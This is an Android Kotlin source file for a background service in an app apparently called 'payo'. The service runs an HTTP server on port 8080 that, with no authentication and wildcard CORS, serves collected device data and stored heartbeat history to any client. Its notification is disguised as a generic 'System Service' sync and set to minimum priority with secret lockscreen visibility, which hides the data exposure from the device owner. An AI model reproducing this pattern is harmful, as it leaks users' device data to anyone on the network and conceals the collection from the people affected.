package com.microspace.payo.services.data

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.microspace.payo.R
import com.microspace.payo.core.device.DeviceDataCollector as CoreDeviceDataCollector
import com.microspace.payo.data.db.AppDatabase
import com.google.gson.GsonBuilder
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import java.io.*
import java.net.ServerSocket
import java.net.Socket

/**
 * Local JSON Data Server Service
 * Serves device data, logs, and errors in JSON format via HTTP
 */
class LocalDataServerService : Service() {
    
    companion object {
        private const val TAG = "LocalDataServer"
        private const val SERVER_PORT = 8080
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "system_data_sync_channel"
        
        fun startService(context: Context) {
            val intent = Intent(context, LocalDataServerService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        
        fun stopService(context: Context) {
            val intent = Intent(context, LocalDataServerService::class.java)
            context.stopService(intent)
        }
    }
    
    private var serverSocket: ServerSocket? = null
    private var isRunning = false
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val gson = GsonBuilder().setPrettyPrinting().create()
    private val db by lazy { AppDatabase.getDatabase(this) }
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())
        startServer()
        return START_STICKY
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopServer()
        serviceScope.cancel()
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    private fun startServer() {
        serviceScope.launch {
            try {
                serverSocket = ServerSocket(SERVER_PORT)
                isRunning = true
                Log.i(TAG, "Server started on port $SERVER_PORT")
                
                while (isRunning && !serverSocket!!.isClosed) {
                    try {
                        val clientSocket = serverSocket!!.accept()
                        launch { handleClient(clientSocket) }
                    } catch (e: Exception) {
                        if (isRunning) {
                            Log.e(TAG, "Client error: ${e.message}")
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start server: ${e.message}")
            }
        }
    }
    
    private fun stopServer() {
        isRunning = false
        try {
            serverSocket?.close()
        } catch (e: Exception) {}
    }
    
    private suspend fun handleClient(clientSocket: Socket) = withContext(Dispatchers.IO) {
        try {
            val reader = BufferedReader(InputStreamReader(clientSocket.getInputStream()))
            val writer = PrintWriter(clientSocket.getOutputStream(), true)
            
            val requestLine = reader.readLine()
            var line: String?
            do {
                line = reader.readLine()
            } while (line != null && line.isNotEmpty())
            
            val parts = requestLine?.split(" ") ?: listOf("GET", "/", "HTTP/1.1")
            val path = parts.getOrNull(1) ?: "/"
            
            val response = when {
                path == "/api/device/data" -> handleDeviceDataRequest()
                path == "/api/history" -> handleHistoryRequest()
                path == "/api/device/all" -> handleAllDataRequest()
                else -> ServerResponse("{\"status\":\"ok\", \"endpoints\": [\"/api/device/data\", \"/api/history\"]}", "application/json")
            }
            
            writer.println("HTTP/1.1 200 OK")
            writer.println("Content-Type: ${response.contentType}")
            writer.println("Access-Control-Allow-Origin: *")
            writer.println("Content-Length: ${response.content.toByteArray().size}")
            writer.println()
            writer.print(response.content)
            writer.flush()
        } catch (e: Exception) {
            Log.e(TAG, "Handler error: ${e.message}")
        } finally {
            try { clientSocket.close() } catch (e: Exception) {}
        }
    }
    
    private fun handleDeviceDataRequest(): ServerResponse {
        return try {
            val deviceCollector = CoreDeviceDataCollector(this@LocalDataServerService)
            val deviceData = deviceCollector.collectHeartbeatData()
            ServerResponse(gson.toJson(deviceData), "application/json")
        } catch (e: Exception) {
            ServerResponse("{}", "application/json")
        }
    }

    private suspend fun handleHistoryRequest(): ServerResponse {
        return try {
            // Get last 50 heartbeats from Room
            val history = db.heartbeatDao().getLatestHeartbeats(50).first()
            ServerResponse(gson.toJson(history), "application/json")
        } catch (e: Exception) {
            ServerResponse("[]", "application/json")
        }
    }
    
    private suspend fun handleAllDataRequest(): ServerResponse {
        // Now returns both live status and history summary
        return try {
            val deviceCollector = CoreDeviceDataCollector(this@LocalDataServerService)
            val liveData = deviceCollector.collectHeartbeatData()
            val history = db.heartbeatDao().getLatestHeartbeats(10).first()
            
            val combined = mapOf(
                "live_status" to liveData,
                "recent_history" to history
            )
            ServerResponse(gson.toJson(combined), "application/json")
        } catch (e: Exception) {
            handleDeviceDataRequest()
        }
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Sync",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System background data synchronization"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Background synchronization in progress")
            .setSmallIcon(R.drawable.nexivo)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }
    
    private data class ServerResponse(val content: String, val contentType: String)
}
